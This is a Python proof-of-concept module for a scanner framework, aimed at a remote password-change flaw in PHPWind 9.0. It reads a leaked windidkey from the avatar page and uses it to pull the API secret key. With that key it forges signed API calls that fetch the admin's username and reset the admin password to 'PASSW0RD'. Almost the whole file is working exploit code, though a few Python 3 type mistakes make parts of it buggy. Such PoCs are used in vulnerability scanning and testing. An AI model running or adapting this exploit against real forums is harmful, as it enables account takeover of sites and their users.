# coding: utf-8
import re
import time
import urllib.request
import urllib.parse
import urllib.error
import json
import urllib.request
import urllib.error
import urllib.parse
from hashlib import md5

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPWind_0102'  # 平台漏洞编号，留空
    name = 'PHPWind 9.0 /src/windid/service/user/srv/WindidUserService.php 远程密码修改'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-12-13'  # 漏洞公布时间
    desc = '''
        phpwind（简称：pw）是一个基于PHP和MySQL的开源社区程序，是国内最受欢迎的通用型论坛程序之一。
        PHPWind v9.0版本中上传头像处误将访问api的密钥泄露，导致 secretkey 泄露，导致可通过api任意修改密码。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=072727'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWind'  # 漏洞应用名称
    product_version = '9.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3e5a0d2f-268a-44bc-abbc-54570da3ed32'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            cookie = ''
            headers_cookie = {"Cookie": cookie}
            windidkey_url = '%s/index.php?m=profile&c=avatar&_left=avatar' % url
            secretkey_url = '%s/windid/index.php?m=api&c=app&a=list&uid=%s&windidkey=%s&time=%s&clientid=1&type=flash'
            # Regex
            match_uid = re.compile('m=space&uid=([\\d])+')
            match_windidkey = re.compile(
                'windidkey%3D([\\w\\d]{32})%26time%3D([\\d]+)%26')

            request = urllib.request.Request(
                windidkey_url, headers=headers_cookie)
            response = str(urllib.request.urlopen(request).read())

            # Get windidkey
            try:
                windidkey, _time = match_windidkey.findall(response)[0]
                uid = match_uid.findall(response)[0]
            except:
                return

            # Get secretkey
            request = urllib.request.Request(secretkey_url % (
                url, uid, windidkey, _time), data='uid=undefined')
            response = json.loads(str(urllib.request.urlopen(request).read()))
            try:
                secretkey = response['1']['secretkey']
            except:
                return

            # Success
            if secretkey:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            cookie = ''
            headers_cookie = {"Cookie": cookie}
            vul_url = '%s/windid/index.php?m=api&c=user&a=%s&windidkey=%s&time=%s&clientid=1&userid=1'
            windidkey_url = '%s/index.php?m=profile&c=avatar&_left=avatar' % url
            secretkey_url = '%s/windid/index.php?m=api&c=app&a=list&uid=%s&windidkey=%s&time=%s&clientid=1&type=flash'
            # Regex
            match_uid = re.compile('m=space&uid=([\\d])+')
            match_windidkey = re.compile(
                'windidkey%3D([\\w\\d]{32})%26time%3D([\\d]+)%26')

            request = urllib.request.Request(
                windidkey_url, headers=headers_cookie)
            response = str(urllib.request.urlopen(request).read())

            # Get windidkey
            try:
                windidkey, _time = match_windidkey.findall(response)[0]
                uid = match_uid.findall(response)[0]
            except:
                return

            # Get secretkey
            request = urllib.request.Request(secretkey_url % (
                url, uid, windidkey, _time), data='uid=undefined')
            response = json.loads(str(urllib.request.urlopen(request).read()))
            try:
                secretkey = response['1']['secretkey']
            except:
                return
            # Get username
            data = {'uid': 1}
            string = 'userid1uid1'
            _time = str(int(time.time()))
            app_key = md5('%s%s%s' % (
                md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
            request = urllib.request.Request(vul_url % (
                url, 'get', app_key, _time), data=urllib.parse.urlencode(data))
            response = json.loads(str(urllib.request.urlopen(request).read()))
            try:
                username = response['username']
            except:
                return
            # Change password
            data = {'password': 'PASSW0RD', 'uid': 1}
            string = 'userid1passwordPASSW0RDuid1'
            _time = str(int(time.time()))
            app_key = md5('%s%s%s' % (
                md5('1||%s' % secretkey).hexdigest(), _time, string)).hexdigest()
            request = urllib.request.Request(vul_url % (
                url, 'editUser', app_key, _time), data=urllib.parse.urlencode(data))
            response = str(urllib.request.urlopen(request).read())

            # Success
            if response == '1':
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取到信息:vul_url={vul_url}，username={username}, password=PASSW0RD'.format(
                    target=self.target, name=self.vuln.name, vul_url=secretkey, username=username))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
